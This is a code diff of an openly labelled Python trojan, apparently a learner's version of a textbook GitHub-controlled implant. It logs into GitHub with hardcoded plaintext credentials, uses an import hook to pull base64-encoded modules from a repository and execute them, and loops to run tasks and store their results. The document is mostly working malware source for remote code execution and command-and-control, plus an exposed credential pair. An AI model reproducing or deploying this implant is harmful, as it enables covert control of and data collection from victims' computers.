@@ -1,22 +1,27 @@
 import sys
-import ramdom
+import random
 import imp
 import threading
 import time
+import json
+import base64
+import os
+import Queue
 from github3 import login
 
 trojan_id = "belajar"
 trojan_config = "%s.json" %(trojan_id)
-configured = True
+configured = False
 have_task = False
-
+trojan_modules = []
+data_path = "data/%s/" %(trojan_id)
+task_queue = Queue.Queue()
 
 def connect_github():
-	gh = login(username="advancenetprog",password="advnetprog1")
-	repo = gh.repository("advancenetprog","belajar")
-	brach = repo.brach("master")
-
-	return gh,repo,brach
+	gh = login(username="advancenetprog",password="advnetprog1")	
+	repo = gh.repository ("advancenetprog","belajar")
+	branch = repo.branch("master")
+	return gh,repo,branch
 
 def get_file_content(filepath):
 	gh ,repo,brach= connect_github()
@@ -53,7 +58,7 @@ class GitImporter(object):
 
 	def find_module(self, fullname, path=None):
 		if configured:
-			new_lib = get_file_content("module/%s" %fullname)
+			new_lib = get_file_content("modules/%s" %fullname)
 			if new_lib is not None:
 				self.current_module = base64.b64decode(new_lib)
 				return self
@@ -66,20 +71,20 @@ class GitImporter(object):
 		return module
 
 def module_runner(name_module):
-	global have_task
-	have_task = True
+	task_queue.put(1)
 	result = sys.modules[name_module].run()
-	have_task = False
+	task_queue.get()
 	store_module_data(result)
 	return
 
 sys.meta_path = [GitImporter()]
 
+connect_github()
 config = get_trojan_config()
 
 while True:
-	if not have_task:
-		for task in config
+	if task_queue.empty():
+		for task in config:
 			t = threading.Thread(target="module_runner", args=(task["module"],))
 			t.start()
 			time.sleep(5)
